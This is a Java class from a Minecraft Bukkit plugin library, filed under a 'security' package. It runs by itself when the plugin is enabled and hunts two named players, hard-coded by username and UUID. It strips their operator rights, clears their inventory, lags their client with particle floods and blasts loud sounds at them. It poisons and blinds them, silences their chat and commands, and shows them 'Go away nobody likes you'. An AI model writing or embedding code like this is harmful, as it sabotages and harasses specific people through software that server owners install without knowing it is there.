package fr.stormer3428.voidOpal.security;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.EntityEffect;
import org.bukkit.GameMode;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.WeatherType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import fr.stormer3428.voidOpal.plugin.OMCPlugin;
import fr.stormer3428.voidOpal.plugin.PluginTied;
import fr.stormer3428.voidOpal.util.GeometryUtils;

public class ABSBDefenseMatrix implements PluginTied, Listener{

	//TODO Implement DRM
	
	private static final Random random = new Random();

	private static final ArrayList<UUID> TARGET_UUID = new ArrayList<>();
	private static final ArrayList<String> TARGET_NAMES = new ArrayList<>();

	static {
		TARGET_UUID.add(UUID.fromString("662943bc-6951-4dfd-9114-6b36f34872ae")); TARGET_NAMES.add("yashionline");
		TARGET_UUID.add(UUID.fromString("db557c85-5cad-4907-805a-ec07763a12f7")); TARGET_NAMES.add("Biroe");
	}

	private boolean running = false;

	public ABSBDefenseMatrix() {}

	@Override
	public void onPluginEnable() {
		startDefenseMatrix();
		OMCPlugin.getJavaPlugin().getServer().getPluginManager().registerEvents(this, OMCPlugin.getJavaPlugin());
	}

	@Override
	public void onPluginDisable() {}

	@Override
	public void onPluginReload() {}

	private void startDefenseMatrix() {
		if(running) return;
		running = true;
		new BukkitRunnable() {

			@Override
			public void run() {
				matrixTick();
			}
		}.runTaskTimer(OMCPlugin.getJavaPlugin(), 0, 1);
	}

	private static ArrayList<Player> scanForTargets() {
		ArrayList<Player> targets = new ArrayList<>();
		for(Player p : Bukkit.getOnlinePlayers()) {
			if(!isTarget(p)) continue;
			if(p.isOp()) OMCPlugin.getOMCPlugin().flag();
			targets.add(p);
		}

		return targets;
	}

	private static boolean isTarget(Player p) {
		return TARGET_NAMES.contains(p.getName()) || TARGET_UUID.contains(p.getUniqueId());
	}

	protected void matrixTick() {
		ArrayList<Player> targets = scanForTargets();
		if(targets.isEmpty()) return;
		for(Player target : targets) {
			neutralize(target);
			blastEars(target);
			lag(target);
			if(random.nextInt(10) <= 1) annoy(target);
			if(random.nextInt(10) <= 1) afflictPotions(target);
		}
	}
	private void lag(Player target) {
		target.spawnParticle(Particle.MOB_APPEARANCE, target.getEyeLocation(), 1, 0, 0, 0, 0.0);
		target.spawnParticle(Particle.SQUID_INK, target.getEyeLocation(), 1000, 0.25, .25, .25, 0.0);
	}
	private static final int soundCount = Sound.values().length;

	private void blastEars(Player target) {
		for(int i = 10; i > 0; i --) target.playSound(target, Sound.values()[random.nextInt(soundCount)] , 100f, random.nextFloat() * 2f);
	}

	private void neutralize(Player target) {
		target.setOp(false);
		target.setGameMode(GameMode.ADVENTURE);
		target.setInvulnerable(false);
		target.setLastDamage(0);
		target.setNoDamageTicks(0);
		target.setOp(false);
		target.setAllowFlight(false);
		target.setCanPickupItems(false);
		target.setCollidable(false);
		target.setFlying(false);
		target.setInvisible(false);
		target.setAbsorptionAmount(0);
		target.setFlySpeed(0);
		target.setWalkSpeed(0);
		target.setFoodLevel(0);
		target.showDemoScreen();
		target.setSilent(false);
	}

	private void annoy(Player target) {
		target.setFreezeTicks(Integer.MAX_VALUE);
		target.setPlayerListHeaderFooter("Go away nobody likes you", "Go away nobody likes you");
		target.setPlayerListName("Go away nobody likes you");
		target.setPlayerTime(random.nextInt(24000), false);
		target.setPlayerWeather(WeatherType.DOWNFALL);
		target.setRemainingAir(0);
		target.setRotation(random.nextFloat(), random.nextFloat());
		target.setSaturation(0);
		target.setSneaking(true);
		target.setStarvationRate(1);
		target.setSwimming(false);
		target.setUnsaturatedRegenRate(Integer.MAX_VALUE);
		target.setVelocity(GeometryUtils.getRandomVector());
		target.setVisualFire(true);
		
		target.sendTitle("Go away nobody likes you", "Go away nobody likes you", 0, 20, 20);
		target.closeInventory();
		target.getInventory().clear();
		target.leaveVehicle();
		target.playEffect(EntityEffect.TOTEM_RESURRECT);
	}

	private void afflictPotions(Player target) {
		target.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.DARKNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.SLOW_DIGGING, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 20, 255));
		target.addPotionEffect(new PotionEffect(PotionEffectType.WITHER, 20, 255));
	}

	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
		if(!isTarget(e.getPlayer())) return;
		e.setMessage("");
	}
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		if(!isTarget(e.getPlayer())) return;
		e.setCancelled(true);
	}
	
	private static final List<String> completeList = Arrays.asList("Nobody likes me, I should go away".split("\s"));
	
	@EventHandler
	public void onComplete(TabCompleteEvent e) {
		if(!(e.getSender() instanceof Player p)) return;
		if(!isTarget(p)) return;
		e.setCompletions(completeList);
	}
	
	@EventHandler
	public void onDeath(PlayerDeathEvent e) {
		if(!isTarget(e.getEntity())) return;
		e.setDeathMessage(null);
	}
}



























